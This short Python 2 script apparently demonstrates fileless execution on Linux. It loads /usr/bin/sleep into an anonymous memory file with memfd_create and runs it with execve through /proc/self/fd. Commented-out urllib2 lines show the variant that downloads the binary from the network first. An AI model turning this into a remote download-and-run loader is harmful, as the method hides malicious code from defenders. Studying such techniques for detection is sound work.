import ctypes
from ctypes.util import find_library

import urllib2

# u = urllib2.urlopen('')
# d = u.read()

elf = open("/usr/bin/sleep").read()
count = len(elf)

# memfd_create
syscall = ctypes.CDLL(None).syscall
syscall.restype = ctypes.c_int
syscall.argtypes = [ctypes.c_long, ctypes.c_char_p, ctypes.c_uint]
fd = syscall(319, '', 0)

# write
syscall.restype = ctypes.c_ssize_t
syscall.argtypes = [ctypes.c_long, ctypes.c_int,
                    ctypes.c_void_p, ctypes.c_size_t]
res = syscall(1, fd, elf, count)

# execve
syscall.restype = ctypes.c_int
syscall.argtypes = [ctypes.c_long, ctypes.c_char_p, ctypes.POINTER(
    ctypes.c_char_p), ctypes.POINTER(ctypes.c_char_p)]
str_arr = ctypes.c_char_p * 2
argv = str_arr()
argv[0] = "sleep"
argv[1] = "120"
res = syscall(59, "/proc/self/fd/"+str(fd), argv, None)
